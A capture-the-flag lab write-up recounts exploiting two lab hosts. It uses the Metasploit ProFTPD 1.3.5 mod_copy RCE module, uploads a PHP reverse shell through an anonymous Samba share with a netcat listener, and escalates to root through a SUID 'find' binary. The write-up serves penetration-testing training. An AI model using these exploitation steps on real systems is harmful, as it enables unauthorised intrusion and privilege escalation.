## Host & Network Penetration Testing: Exploitation CTF 3

### Flag 1: A vulnerable service maybe running on target1.ine.local. If exploitable, retrieve the flag from the root directory.

We begin with an Nmap scan:
```
nmap -sS -T4 -p- target1.ine.local
```
```
nmap -sS -sV -T4 -p21,80 target1.ine.local
```
We discovered a vulnerable service on port 21: ProFTPD 1.3.5.
With the help of searchsploit, we found a Metasploit module used for RCE (remote code execution).

We choose to use this module in particular:
```
use exploit/unix/ftp/proftpd_modcopy_exec
```
The default payload is the Netcat one.
After a brief configuration, we try to execute the module without success.
Setting:
```
set SITEPATH /var/www/html
```
helps us to carry on a little bit, but anyway without success, because the module execute with an error.
However it created a session.
Interacting with the created session and navigating to the root, we can find the first flag.

### Flag 2: Further, a quick interaction with a local network service on target1.ine.local may reveal this flag. Use the hint given in the previous flag.

This flag is a bit tricky.
After some time spent investigating, we discovered that the command "netstat" is what we need.
```
netstat -lae
```
There is a service in state "LISTENING" on localhost:8888 that we can connect to on the machine.
```
nc -v localhost 8888
letmein
```
and we obtain the second flag.

### Flag 3: A misconfigured service running on target2.ine.local may help you gain access to the machine. Can you retrieve the flag from the root directory?

On the second target we can identify tre ports open.
```
nmap -sS -T4 -sV -p80,139,445 targe2.ine.local
```
The Samba service is open to enumeration with an anonymous user.
```
smbclient -N -L target2.ine.local
smbclient -U anonymous -N //target2.ine.local/site-uploads
```
Serve type is Apache so we can try to upload a web shell written in PHP.
```
smb: \> put php-reverse-shell.php
nc -nlvp 1234
http://targe2.ine.local/site-uploads/php-reverse-shell.php
```
We obtain a reverse shell and the third flag on the root directory.

### Flag 4: Can you escalate to root on target2.ine.local and read the flag from the restricted /root directory?

After some research, we found a way to exploit a misconfiguration of SUID permissions.
```
find / -perm -u=s -type f 2>/dev/null
```
In particular, the object of misconfiguration is the "find" command.

We try:
```
find /root -name "flag*.*"
```
finding the fourth flag that we can print in the terminal with the command:
```
find . -exec cat "/root/flag4.txt" \;
```
